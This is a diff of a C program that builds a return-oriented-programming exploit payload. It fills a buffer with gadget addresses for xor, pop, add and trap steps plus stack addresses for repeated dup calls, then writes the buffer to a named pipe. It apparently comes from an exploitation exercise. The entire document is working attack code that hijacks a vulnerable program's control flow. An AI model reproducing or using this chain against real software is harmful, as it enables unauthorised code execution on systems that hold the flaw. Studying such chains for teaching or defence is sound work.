@@ -73,11 +73,11 @@ int main(void)
   char dup_call_3_addr[] = "\xf8\x68\xbf\xbf"; // bufr + 475, BFBF 68F8
   char dup_call_arg_addr[] = "\xfc\x68\xbf\xbf"; // bufr + 479, BFBF 68FC
   // #2
-  char dup_call2_3_addr[] = "\x08\x69\xbf\xbf"; //bufr + 491, BFBF 6908
-  char dup_call2_arg_addr[] = "\x0C\x69\xbf\xbf"; //bufr + 495, BFBF 690C
+  char dup_call2_3_addr[] = "\x24\x6c\xbf\xbf"; //bufr + 507, BFBF 6C24
+  char dup_call2_arg_addr[] = "\x28\x6c\xbf\xbf"; //bufr + 511, BFBF 6C28
   // #3
-  char dup_call3_3_addr[] = "\x18\x69\xbf\xbf"; // bufr + 507, BFBF 6918
-  char dup_call3_arg_addr[] = "\x1c\x69\xbf\xbf"; // bufr + 511, BFBF 691C
+  char dup_call3_3_addr[] = "\x38\x69\xbf\xbf"; // bufr + 539, BFBF 6938
+  char dup_call3_arg_addr[] = "\x3c\x69\xbf\xbf"; // bufr + 543, BFBF 693C
 
 
   int i;
@@ -249,19 +249,33 @@ int main(void)
   // 4 byte value 0
   strcpy(bufr + 479, "\x01\x01\x01\x01");
   // ---------------------------------------------------------- call #2
-  strcpy(bufr + 483, trap); // 0xbba9b6e5, location is 0xbfbf6900
-  strcpy(bufr + 487, jump_8); // 0xbbb2d3e2
-  // 4 byte value 3
-  strcpy(bufr + 491, "\x01\x01\x01\x01");
-  // 4 byte value 1
-  strcpy(bufr + 495, "\x01\x01\x01\x01");
-  // ---------------------------------------------------------- call #3
-  strcpy(bufr + 499, trap); // 0xbba9b6e5, location is 0xbfbf6910
+  strcpy(bufr + 483, xor_eax); // 0xbba9b3c2
+  // put seed into edx
+  strcpy(bufr + 487, pop_edx); // 0xbbb9dc1b
+  strcpy(bufr + 491, dup_arg_seed);
+  // add first 8 bits to eax
+  strcpy(bufr + 495, add_dl_al); // 0xbbbb4607
+                                // eax should hold 98, 0x62
+  strcpy(bufr + 499, trap); // 0xbba9b6e5, location is 0xbfbf6900
   strcpy(bufr + 503, jump_8); // 0xbbb2d3e2
   // 4 byte value 3
   strcpy(bufr + 507, "\x01\x01\x01\x01");
-  // 4 byte value 2
+  // 4 byte value 1
   strcpy(bufr + 511, "\x01\x01\x01\x01");
+  // ---------------------------------------------------------- call #3
+  strcpy(bufr + 515, xor_eax); // 0xbba9b3c2
+  // put seed into edx
+  strcpy(bufr + 519, pop_edx); // 0xbbb9dc1b
+  strcpy(bufr + 523, dup_arg_seed);
+  // add first 8 bits to eax
+  strcpy(bufr + 527, add_dl_al); // 0xbbbb4607
+                                // eax should hold 98, 0x62
+  strcpy(bufr + 531, trap); // 0xbba9b6e5, location is 0xbfbf6910
+  strcpy(bufr + 535, jump_8); // 0xbbb2d3e2
+  // 4 byte value 3
+  strcpy(bufr + 539, "\x01\x01\x01\x01");
+  // 4 byte value 2
+  strcpy(bufr + 543, "\x01\x01\x01\x01");
 
 
   writecmd(PIPEPATH, bufr);
